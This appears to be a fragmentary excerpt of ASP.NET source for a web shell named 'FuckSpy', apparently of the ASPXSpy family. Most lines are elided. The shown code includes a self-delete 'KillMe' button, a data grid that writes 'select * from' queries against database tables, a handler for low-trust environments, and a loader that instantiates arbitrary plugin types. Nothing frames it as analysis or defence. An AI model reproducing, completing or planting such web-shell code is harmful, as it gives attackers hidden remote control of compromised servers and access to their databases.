...
<script runat="server">
	...
	public const string Version="FuckSpy2014";
	...
	void IHttpHandler.ProcessRequest(HttpContext context)
	{
		...
		catch(SecurityException ex){context.Response.Clear();context.Response.Write("FuckSpy request low-trust minimum,Exception message: "+ex.Message);}
	...
	private void zcg_SetHeaderInfo()
	{
		...
		Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete FuckSpy?')){Bin_PostBack('Bin_KillMe','');};";
	...
	private void Bin_DataBind()
	{
		try
		{
			...
			for(int i=0;i<Bin_DataGrid.Items.Count;i++)
			{
				...
				zcg_SetControlAttribute(Bin_DataGrid.Items[i]);
				Bin_DataGrid.Items[i].Attributes["onclick"]="FuckSpy.Bin_Textarea_Query.value='select * from " + tname + "';";
			}
			Bin_DataGrid.Visible=true;
		}
		catch(Exception e)
	...
	protected void zcg_btnplgLoad_Click(object sender,EventArgs e)
	{
		...
		try
		{
			...
			else
			{
				...
				string TypeName=string.IsNullOrEmpty(zcg_txbTypeName.Text)?"Zcg.Test.FuckSpyPlugins.TestPlugin":zcg_txbTypeName.Text;
